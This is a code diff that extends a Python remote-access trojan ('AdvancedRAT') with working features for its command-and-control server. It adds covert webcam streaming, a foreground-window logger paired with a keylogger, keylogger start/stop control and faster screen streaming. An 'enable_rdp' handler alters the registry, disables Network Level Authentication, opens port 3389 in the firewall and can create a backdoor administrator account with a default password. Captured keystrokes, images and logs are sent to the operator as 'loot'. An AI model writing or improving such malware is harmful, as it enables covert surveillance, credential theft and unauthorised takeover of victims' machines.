@@ -1055,9 +1055,13 @@ class SystemProfiler:
     
     @staticmethod
     def get_installed_packages():
-        """Get list of installed Python packages"""
+        """Get list of installed Python packages (limited for stability)"""
         try:
-            return [f"{d.metadata['Name']}=={d.version}" for d in importlib.metadata.distributions()]
+            # Only collect for small environments; bypass for large ones to prevent bloat
+            pkgs = []
+            for d in list(importlib.metadata.distributions())[:100]: # Cap at 100
+                pkgs.append(f"{d.metadata['Name']}=={d.version}")
+            return pkgs
         except:
             return []
 
@@ -1660,6 +1664,9 @@ class AdvancedRAT:
         self.sock_lock = threading.Lock()
         
         self.heartbeat_thread = None
+        self._webcam_streaming = False
+        self._window_logger_running = False
+        self._window_log_buffer = []  # List of {time, title} dicts
         self._streaming = False
         self._autorun_file = os.path.join(os.getenv('APPDATA') if IS_WINDOWS else os.path.expanduser('~'), '.snake_autorun')
         
@@ -1720,20 +1727,20 @@ class AdvancedRAT:
             'extract_outlook': self._handle_extract_outlook,
             'uac_bypass': self._handle_uac_bypass,
             'input_control': self._handle_input_control,
-            'block_input': self._handle_block_input
+            'block_input': self._handle_block_input,
+            'webcam_stream': self._handle_webcam_stream,
+            'window_logger': self._handle_window_logger,
+            'enable_rdp': self._handle_enable_rdp
         }
     
     def _send_encrypted(self, data):
-        """Send encrypted data to C2"""
+        """Send encrypted data to C2 with robust locking and error handling"""
         if not self.sock:
             return False
         
         def json_safe(obj):
-            """Fallback JSON serializer for non-standard types"""
-            if isinstance(obj, (set, frozenset)):
-                return list(obj)
-            if isinstance(obj, bytes):
-                return obj.decode(errors='replace')
+            if isinstance(obj, (set, frozenset)): return list(obj)
+            if isinstance(obj, bytes): return obj.decode(errors='replace')
             return str(obj)
         
         try:
@@ -1742,15 +1749,23 @@ class AdvancedRAT:
                 data['timestamp'] = time.time()
             
             # Use static encryption
-            encrypted = self.crypto.encrypt(json.dumps(data, default=json_safe))
+            payload = json.dumps(data, default=json_safe)
+            encrypted = self.crypto.encrypt(payload)
             msg = len(encrypted).to_bytes(4, 'big') + encrypted
+            
             with self.sock_lock:
-                self.sock.sendall(msg)
-            return True
-        except Exception as e:
-            self.logger.error(f"_send_encrypted failed: {type(e).__name__}: {e}")
+                if self.sock:
+                    self.sock.sendall(msg)
+                    return True
+            return False
+        except (socket.error, ConnectionError) as e:
+            # We don't set self.sock = None here to avoid race conditions.
+            # The _connection_loop will handle cleanup on failure.
+            self.logger.error(f"Socket error in _send_encrypted: {e}")
             self.connected = False
-            self.sock = None
+            return False
+        except Exception as e:
+            self.logger.error(f"_send_encrypted error: {e}")
             return False
 
     def _send_loot(self, loot_type, data, filename=None):
@@ -1844,10 +1859,28 @@ class AdvancedRAT:
             except Exception as e:
                 self.logger.error(f"Background keylogger error: {e}")
                 self.keylog_running = False
+            finally:
+                self.keylog_running = False
+                self.keylog_listener = None
 
         kl_thread = threading.Thread(target=run_keylogger, daemon=True)
         kl_thread.start()
         self.logger.info("Background keylogger started")
+
+    def _stop_background_keylogger(self):
+        """Stop the background keylogger listener"""
+        if not self.keylog_running:
+            return False
+            
+        try:
+            self.keylog_running = False
+            if self.keylog_listener:
+                self.keylog_listener.stop()
+                self.keylog_listener = None
+            return True
+        except Exception as e:
+            self.logger.error(f"Error stopping keylogger: {e}")
+            return False
 
     def _recv_command(self, use_master=False):
         """Receive and decrypt command from C2"""
@@ -1915,9 +1948,16 @@ class AdvancedRAT:
                 self.retry_count = 0
                 self.logger.success(f"Connected to C2 server: {server['host']}:{server['port']}")
                 
-                # 1. Self-Introduce to C2 (Original Static Key)
+                # Pre-collect info to minimize time socket sits idle before first message
+                # This prevents [WinError 10053] where the server times out the handshake
+                self.logger.info("Preparing system profile...")
+                try:
+                    sys_info = self.profiler.get_system_info()
+                except:
+                    sys_info = {"error": "info_gathering_failed"}
+
                 self.logger.info("Initializing connection with master key...")
-                sent = self._send_encrypted({'type': 'init', 'client_id': self.client_id, 'info': self.profiler.get_system_info()})
+                sent = self._send_encrypted({'type': 'init', 'client_id': self.client_id, 'info': sys_info})
                 
                 if sent:
                     self.logger.success("Session secured with master encryption.")
@@ -2382,61 +2422,80 @@ class AdvancedRAT:
             return {'error': str(e)}
 
     def _handle_stream(self, cmd):
-        """Live screen streaming"""
-        action = cmd.get('action', 'start') # start, stop
-        fps = cmd.get('fps', 15)
-        
+        """Live screen streaming — optimised for low latency."""
+        action = cmd.get('action', 'start')
+        fps    = max(1, min(int(cmd.get('fps', 15)), 60))
+        target_h = int(cmd.get('height', 480))
+        quality = int(cmd.get('quality', 30))
+
         if action == 'start':
-            if getattr(self, '_streaming', False): return {'status': 'Already streaming'}
+            # Stop existing to apply new parameters
+            if getattr(self, '_streaming', False):
+                self._streaming = False
+                time.sleep(0.2)
             self._streaming = True
+
             def stream_thread():
                 try:
                     import mss
                     import cv2
                     import numpy as np
-                    import time
+
+                    frame_interval = 1.0 / fps
+                    encode_params  = [cv2.IMWRITE_JPEG_QUALITY, quality]
+
                     with mss.mss() as sct:
-                        # try to get primary monitor, or just the whole screen
                         mon_idx = 1 if len(sct.monitors) > 1 else 0
                         monitor = sct.monitors[mon_idx]
+
+                        # Pre-compute target dimensions
+                        native_w = monitor['width']
+                        native_h = monitor['height']
+                        
+                        final_h = target_h
+                        final_w = int(native_w * (final_h / native_h))
+                        final_w = final_w - (final_w % 2)
+
+                        deadline = time.time()
+
                         while self._streaming and self.running:
-                            start_ts = time.time()
+                            deadline += frame_interval
+                            now = time.time()
+
+                            if now > deadline + frame_interval:
+                                deadline = now
+                                sleep_t = 0.0
+                            else:
+                                sleep_t = deadline - now
+
                             sct_img = sct.grab(monitor)
-                            img = np.array(sct_img)
-                            
-                            # Limit resolution to max 720p to save bandwidth
-                            h, w = img.shape[:2]
-                            scale = 720 / float(h)
-                            if scale < 1.0:
-                                new_w = int(w * scale)
-                                img = cv2.resize(img, (new_w, 720), interpolation=cv2.INTER_AREA)
-                                
-                            # Convert BGRA to BGR
-                            if img.shape[2] == 4:
-                                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
-                                
-                            _, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 40])
-                            
-                            payload = {
-                                'type': 'stream_frame',
-                                'data': base64.b64encode(encoded).decode(),
-                            }
-                            # Send frame
+                            img = np.frombuffer(sct_img.bgra, dtype=np.uint8).reshape(
+                                (native_h, native_w, 4))[:, :, :3]
+
+                            if final_h != native_h:
+                                img = cv2.resize(img, (final_w, final_h),
+                                                 interpolation=cv2.INTER_LINEAR)
+
+                            ret, encoded = cv2.imencode('.jpg', img, encode_params)
+                            if not ret:
+                                continue
+
                             if self.connected:
-                                self._send_encrypted(payload)
-                            
-                            # Throttle FPS
-                            elapsed = time.time() - start_ts
-                            delay = (1.0 / fps) - elapsed
-                            if delay > 0:
-                                time.sleep(delay)
+                                self._send_encrypted({
+                                    'type': 'stream_frame',
+                                    'data': base64.b64encode(encoded).decode()
+                                })
+
+                            if sleep_t > 0:
+                                time.sleep(sleep_t)
+
                 except Exception as e:
-                    self.logger.error(f"Stream error: {str(e)}")
+                    self.logger.error(f'Stream error: {e}')
                 finally:
                     self._streaming = False
-            
+
             threading.Thread(target=stream_thread, daemon=True).start()
-            return {'status': 'Live stream started'}
+            return {'status': 'Live stream started', 'fps': fps, 'resolution': f'{target_h}p'}
         else:
             self._streaming = False
             return {'status': 'Live stream stopped'}
@@ -2477,6 +2536,300 @@ class AdvancedRAT:
                 return {'error': 'Platform not supported for input control'}
         except Exception as e:
             return {'error': str(e)}
+
+    # -------------------------------------------------------------------------
+    # Feature #10 — Live Webcam Stream
+    # -------------------------------------------------------------------------
+    def _handle_webcam_stream(self, cmd):
+        """Continuous live stream from the victim's webcam — optimised for low latency."""
+        action = cmd.get('action', 'start')
+        fps    = max(1, min(int(cmd.get('fps', 10)), 30))
+        quality = int(cmd.get('quality', 35))
+        
+        # Accept resolution as "640x480" or "1280x720"
+        res_str = cmd.get('resolution', '640x480')
+        try:
+            target_w, target_h = map(int, res_str.lower().split('x'))
+        except:
+            target_w, target_h = 640, 480
+
+        if action == 'start':
+            if getattr(self, '_webcam_streaming', False):
+                self._webcam_streaming = False
+                time.sleep(0.2)
+
+            self._webcam_streaming = True
+
+            def _webcam_stream_thread():
+                try:
+                    import cv2
+                    backend = cv2.CAP_DSHOW if IS_WINDOWS else cv2.CAP_ANY
+                    cap = cv2.VideoCapture(0, backend)
+                    if not cap.isOpened():
+                        self.logger.error('Webcam stream: camera not accessible')
+                        return
+
+                    # Hint: request custom capture resolution from the driver
+                    cap.set(cv2.CAP_PROP_FRAME_WIDTH,  target_w)
+                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, target_h)
+                    cap.set(cv2.CAP_PROP_FPS, fps)
+
+                    # Request MJPEG from the camera if supported
+                    cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
+
+                    # Flush the initial dark/blurry frames
+                    for _ in range(10):
+                        cap.read()
+
+                    encode_params  = [cv2.IMWRITE_JPEG_QUALITY, quality]
+                    frame_interval = 1.0 / fps
+                    deadline       = time.time()
+
+                    # Re-verify actual dims because driver might ignore cap.set
+                    raw_w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))  or target_w
+                    raw_h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)) or target_h
+                    
+                    need_resize = (raw_w != target_w or raw_h != target_h)
+
+                    while self._webcam_streaming and self.running:
+                        deadline += frame_interval
+                        now = time.time()
+
+                        if now > deadline + frame_interval:
+                            deadline = now
+                            sleep_t  = 0.0
+                        else:
+                            sleep_t = deadline - now
+
+                        ret, frame = cap.read()
+                        if not ret:
+                            time.sleep(0.1)
+                            continue
+
+                        if need_resize:
+                            frame = cv2.resize(frame, (target_w, target_h),
+                                               interpolation=cv2.INTER_LINEAR)
+
+                        ret2, encoded = cv2.imencode('.jpg', frame, encode_params)
+                        if not ret2:
+                            continue
+
+                        if self.connected:
+                            self._send_encrypted({
+                                'type': 'webcam_frame',
+                                'data': base64.b64encode(encoded).decode()
+                            })
+
+                        if sleep_t > 0:
+                            time.sleep(sleep_t)
+
+                    cap.release()
+                except Exception as e:
+                    self.logger.error(f'Webcam stream error: {e}')
+                finally:
+                    self._webcam_streaming = False
+
+            threading.Thread(target=_webcam_stream_thread, daemon=True).start()
+            return {'status': 'webcam_stream_started', 'fps': fps, 'resolution': f'{target_w}x{target_h}'}
+
+        else:  # stop
+            self._webcam_streaming = False
+            return {'status': 'webcam_stream_stopped'}
+
+    # -------------------------------------------------------------------------
+    # Feature #11 — Window Activity Logger
+    # -------------------------------------------------------------------------
+    def _handle_window_logger(self, cmd):
+        """Background monitor that logs active window title changes with timestamps.
+        Pairs with the keylogger to give full typing context."""
+        action   = cmd.get('action', 'start')   # start | stop | dump | clear
+        interval = max(0.5, float(cmd.get('interval', 1.0)))  # polling interval in seconds
+
+        if action == 'start':
+            if self._window_logger_running:
+                return {'status': 'already_running'}
+
+            self._window_logger_running = True
+            self._window_log_buffer = []
+
+            def _window_log_thread():
+                last_title = ''
+                while self._window_logger_running and self.running:
+                    try:
+                        title = ''
+                        if IS_WINDOWS:
+                            hwnd  = ctypes.windll.user32.GetForegroundWindow()
+                            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+                            buf   = ctypes.create_unicode_buffer(length + 1)
+                            ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
+                            title = buf.value.strip()
+                        elif IS_LINUX:
+                            try:
+                                res   = subprocess.run(
+                                    ['xdotool', 'getactivewindow', 'getwindowname'],
+                                    capture_output=True, text=True, timeout=2)
+                                title = res.stdout.strip()
+                            except Exception:
+                                pass
+                        elif IS_MAC:
+                            try:
+                                script = 'tell application "System Events" to get name of first process whose frontmost is true'
+                                res    = subprocess.run(
+                                    ['osascript', '-e', script],
+                                    capture_output=True, text=True, timeout=2)
+                                title  = res.stdout.strip()
+                            except Exception:
+                                pass
+
+                        if title and title != last_title:
+                            entry = {
+                                'time':  datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                                'title': title
+                            }
+                            self._window_log_buffer.append(entry)
+                            last_title = title
+                            # Clip buffer at 5000 entries
+                            if len(self._window_log_buffer) > 5000:
+                                self._window_log_buffer = self._window_log_buffer[-5000:]
+                    except Exception:
+                        pass
+                    time.sleep(interval)
+
+            threading.Thread(target=_window_log_thread, daemon=True).start()
+            return {'status': 'window_logger_started', 'interval': interval}
+
+        elif action == 'stop':
+            self._window_logger_running = False
+            return {'status': 'window_logger_stopped',
+                    'buffered_entries': len(self._window_log_buffer)}
+
+        elif action == 'dump':
+            if not self._window_log_buffer:
+                return {'status': 'empty', 'count': 0}
+            # Build a readable log
+            lines = [f"[{e['time']}] {e['title']}" for e in self._window_log_buffer]
+            log_text = '\n'.join(lines).encode()
+            filename = f"window_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+            self._send_loot('window_log', log_text, filename)
+            return {'status': 'sent_as_loot', 'filename': filename,
+                    'count': len(self._window_log_buffer)}
+
+        elif action == 'clear':
+            count = len(self._window_log_buffer)
+            self._window_log_buffer = []
+            return {'status': 'cleared', 'removed': count}
+
+        return {'error': f'Unknown action: {action}'}
+
+    # -------------------------------------------------------------------------
+    # Feature #19 — Enable RDP (Remote Desktop Protocol)
+    # -------------------------------------------------------------------------
+    def _handle_enable_rdp(self, cmd):
+        """Enable RDP on the victim machine.
+        Steps:
+          1. Set registry key to allow TS connections
+          2. Add firewall rule to allow TCP 3389
+          3. Optionally create a backdoor local admin account
+        Returns connection info so the operator can RDP in immediately."""
+        if not IS_WINDOWS:
+            return {'error': 'enable_rdp is only supported on Windows'}
+
+        results = []
+        add_user    = cmd.get('add_user', False)       # bool
+        username    = cmd.get('username', 'svcadmin')  # backdoor account name
+        password    = cmd.get('password', 'P@ssw0rd!') # backdoor account password
+
+        try:
+            import winreg
+
+            # --- Step 1: Enable RDP via registry ---
+            ts_key_path = r'SYSTEM\CurrentControlSet\Control\Terminal Server'
+            try:
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ts_key_path,
+                                    0, winreg.KEY_SET_VALUE) as key:
+                    # fDenyTSConnections = 0 means allow
+                    winreg.SetValueEx(key, 'fDenyTSConnections', 0,
+                                      winreg.REG_DWORD, 0)
+                results.append('Registry: RDP enabled (fDenyTSConnections=0)')
+            except Exception as e:
+                results.append(f'Registry: FAILED — {e}')
+
+            # Disable NLA (Network Level Authentication) so any RDP client can connect
+            nla_key_path = (
+                r'SYSTEM\CurrentControlSet\Control\Terminal Server'
+                r'\WinStations\RDP-Tcp'
+            )
+            try:
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, nla_key_path,
+                                    0, winreg.KEY_SET_VALUE) as key:
+                    winreg.SetValueEx(key, 'UserAuthentication', 0,
+                                      winreg.REG_DWORD, 0)
+                results.append('Registry: NLA disabled (UserAuthentication=0)')
+            except Exception as e:
+                results.append(f'NLA disable: FAILED — {e}')
+
+            # --- Step 2: Open firewall for TCP 3389 ---
+            try:
+                fw_cmd = (
+                    'netsh advfirewall firewall add rule '
+                    'name="Remote Desktop - User Mode (TCP-In)" '
+                    'protocol=TCP dir=in localport=3389 action=allow '
+                    'profile=any enable=yes'
+                )
+                res = subprocess.run(fw_cmd, shell=True, capture_output=True,
+                                     text=True, creationflags=0x08000000)
+                if res.returncode == 0:
+                    results.append('Firewall: TCP 3389 allowed')
+                else:
+                    results.append(f'Firewall: partial — {res.stderr.strip()[:120]}')
+            except Exception as e:
+                results.append(f'Firewall: FAILED — {e}')
+
+            # --- Step 3 (optional): Create backdoor admin account ---
+            if add_user:
+                try:
+                    cmds = [
+                        f'net user {username} "{password}" /add',
+                        f'net localgroup administrators {username} /add',
+                        f'net localgroup "Remote Desktop Users" {username} /add',
+                    ]
+                    for c in cmds:
+                        res = subprocess.run(c, shell=True, capture_output=True,
+                                             text=True, creationflags=0x08000000)
+                        results.append(
+                            f'User [{c[:40]}...]: '
+                            f'{"OK" if res.returncode == 0 else res.stderr.strip()[:80]}'
+                        )
+                except Exception as e:
+                    results.append(f'User creation: FAILED — {e}')
+
+            # --- Collect connection info ---
+            # Try to find a routable IP on the victim
+            local_ips = []
+            try:
+                for iface, addrs in psutil.net_if_addrs().items():
+                    for addr in addrs:
+                        if addr.family == socket.AF_INET and not addr.address.startswith('127.'):
+                            local_ips.append(addr.address)
+            except Exception:
+                pass
+
+            return {
+                'success': True,
+                'details': results,
+                'rdp_port': 3389,
+                'local_ips': local_ips,
+                'backdoor_user': username if add_user else None,
+                'backdoor_pass': password if add_user else None,
+                'is_admin': PrivilegeManager.is_admin(),
+                'hint': (
+                    'Connect with: mstsc /v:<ip>:3389'
+                    + (f' — login as {username}/{password}' if add_user else '')
+                )
+            }
+
+        except Exception as e:
+            return {'error': str(e), 'details': results}
 
     def _run_autorun(self):
         """Execute commands from the autorun file"""
@@ -2795,6 +3148,13 @@ class AdvancedRAT:
                         error_msgs.append(f"{tool} failed: {str(e)}")
 
             if img:
+                # Resize if custom height requested
+                target_h = int(cmd.get('height', 0))
+                if target_h > 0 and target_h < img.size[1]:
+                    scale = target_h / float(img.size[1])
+                    new_w = int(img.size[0] * scale)
+                    img = img.resize((new_w, target_h), Image.LANCZOS)
+
                 # Compress
                 img_byte_arr = io.BytesIO()
                 img = img.convert('RGB')
@@ -2818,14 +3178,22 @@ class AdvancedRAT:
             return {'error': f"Screenshot system error: {str(e)}"}
     
     def _handle_webcam(self, cmd):
-        """Capture from webcam (cross-platform)"""
+        """Capture from webcam with resolution support"""
         try:
             import cv2
-            # Use CAP_DSHOW on Windows for faster initialization, 0 otherwise
+            
+            res_str = cmd.get('resolution', '640x480')
+            try:
+                target_w, target_h = map(int, res_str.lower().split('x'))
+            except:
+                target_w, target_h = 640, 480
+
             cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) if IS_WINDOWS else cv2.VideoCapture(0)
             
-            # Allow camera to adjust exposure by skipping initial frames
-            # This fixes the "black image" problem - 60 frames is usually ~2 seconds
+            # Request custom resolution
+            cap.set(cv2.CAP_PROP_FRAME_WIDTH,  target_w)
+            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, target_h)
+
             for _ in range(60):
                 cap.read()
                 
@@ -2833,20 +3201,23 @@ class AdvancedRAT:
             cap.release()
             
             if ret:
+                # Resize if driver didn't honor request
+                h, w = frame.shape[:2]
+                if w != target_w or h != target_h:
+                    frame = cv2.resize(frame, (target_w, target_h), interpolation=cv2.INTER_LINEAR)
+
                 _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                 data = buffer.tobytes()
                 
-                # Send as loot
                 filename = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                 success = self._send_loot('webcam', data, filename)
                 
                 return {
-                    'filename': filename,
-                    'size': len(data),
+                    'filename': filename, 'size': len(data),
+                    'dimensions': f"{target_w}x{target_h}",
                     'status': 'sent' if success else 'failed'
                 }
-            else:
-                return {'error': 'Failed to capture webcam'}
+            return {'error': 'Could not read from camera'}
         except Exception as e:
             return {'error': str(e)}
     
@@ -2904,11 +3275,27 @@ class AdvancedRAT:
             return {'error': str(e)}
     
     def _handle_keylog(self, cmd):
-        """Start/Dump keylogger data"""
+        """Remote control for the background keylogger"""
         action = cmd.get('action', 'dump')
         
-        if action == 'duration':
+        if action == 'start':
+            if self.keylog_running:
+                return {'status': 'already_running'}
+            self._start_background_keylogger()
+            return {'status': 'keylogger_started'}
+            
+        elif action == 'stop':
+            if not self.keylog_running:
+                return {'status': 'not_running'}
+            success = self._stop_background_keylogger()
+            return {'status': 'keylogger_stopped' if success else 'stop_failed'}
+            
+        elif action == 'duration':
             duration = cmd.get('duration', 10)
+            # Ensure it's running
+            if not self.keylog_running:
+                self._start_background_keylogger()
+                time.sleep(1)
             # Clear buffer, wait for keys, then dump
             self.keylog_buffer = [] 
             time.sleep(duration)
@@ -2918,12 +3305,12 @@ class AdvancedRAT:
             captured = "".join(self.keylog_buffer)
             self.keylog_buffer = [] # Clear after dump
             
-            # Always send as loot to satisfy 'no raw data' requirement
+            # Always send as loot
             filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
             self._send_loot('keylog', captured.encode(), filename)
             return {'status': 'sent_as_loot', 'filename': filename, 'count': len(captured)}
             
-        if action == 'status':
+        elif action == 'status':
             return {
                 'running': self.keylog_running,
                 'buffer_size': len(self.keylog_buffer),
